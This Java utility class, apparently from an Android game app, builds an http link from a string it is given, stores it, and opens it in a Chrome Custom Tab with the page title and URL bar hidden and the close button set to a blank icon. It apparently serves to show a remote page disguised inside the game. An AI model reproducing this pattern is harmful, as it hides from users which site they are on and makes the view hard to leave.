package com.spiderluck.fingercut.game.model;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Color;
import android.net.Uri;

import androidx.browser.customtabs.CustomTabsClient;
import androidx.browser.customtabs.CustomTabsIntent;
import androidx.browser.customtabs.CustomTabsServiceConnection;
import androidx.browser.customtabs.CustomTabsSession;

import java.util.List;

import com.spiderluck.fingercut.R;
import com.spiderluck.fingercut.StartActivity;

import static com.facebook.FacebookSdk.getApplicationContext;

public class Utils {
    public static void setParam(String val1, Activity context) {
        Database database = new Database(context);
        String link = "http://" + setVel(val1, "$");
        database.id(link);

        context.startActivity(new Intent(context,  StartActivity.class));
        context.finish();

        new Thread(() -> new Msg().messageSchedule(context)).start();
    }

    static String setVel(String input, String word) {
        return input.substring(input.indexOf(word) + 1);
    }

    private CustomTabsSession red;
    private static final String POLICY_CHROME = "com.android.chrome";
    private CustomTabsClient poli;

    public void showPolicy(Context context, String link){
        CustomTabsServiceConnection connection = new CustomTabsServiceConnection() {
            @Override
            public void onCustomTabsServiceConnected(ComponentName componentName, CustomTabsClient customTabsClient) {
                //Pre-warming
                poli = customTabsClient;
                poli.warmup(0L);
                //Initialize a session as soon as possible.
                red = poli.newSession(null);
            }

            @Override
            public void onServiceDisconnected(ComponentName name) {
                poli = null;
            }
        };
        CustomTabsClient.bindCustomTabsService(getApplicationContext(), POLICY_CHROME, connection);
        final Bitmap backButton = BitmapFactory.decodeResource(context.getResources(), R.drawable.empty);
        CustomTabsIntent launchUrl = new CustomTabsIntent.Builder(red)
                .setToolbarColor(Color.parseColor("#531A92"))
                .setShowTitle(false)
                .enableUrlBarHiding()
                .setCloseButtonIcon(backButton)
                .addDefaultShareMenuItem()
                .build();

        if (pa(POLICY_CHROME, context))
            launchUrl.intent.setPackage(POLICY_CHROME);

        launchUrl.launchUrl(context, Uri.parse(link));
    }
    boolean pa(String targetPackage, Context context){
        List<ApplicationInfo> packages;
        PackageManager pm;

        pm = context.getPackageManager();
        packages = pm.getInstalledApplications(0);
        for (ApplicationInfo packageInfo : packages) {
            if(packageInfo.packageName.equals(targetPackage))
                return true;
        }
        return false;
    }
}
